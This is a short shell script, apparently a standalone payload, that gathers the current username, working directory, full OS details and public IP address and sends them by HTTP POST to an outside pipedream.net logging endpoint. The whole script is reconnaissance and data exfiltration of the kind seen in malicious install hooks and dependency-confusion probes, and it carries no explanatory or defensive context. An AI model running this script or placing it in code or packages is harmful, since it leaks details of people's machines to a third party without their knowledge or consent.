USERNAME=$(whoami)
CURRENT_DIR=$(pwd)
OS_DETAILS=$(uname -a)
IP_ADDRESS=$(curl -s https://api.ipify.org)

SERVER_URL="https://eoqkn5sgizz6u8q.m.pipedream.net/log"

curl -X POST -d "username=$USERNAME&directory=$CURRENT_DIR&os=$OS_DETAILS&ip=$IP_ADDRESS" "$SERVER_URL"

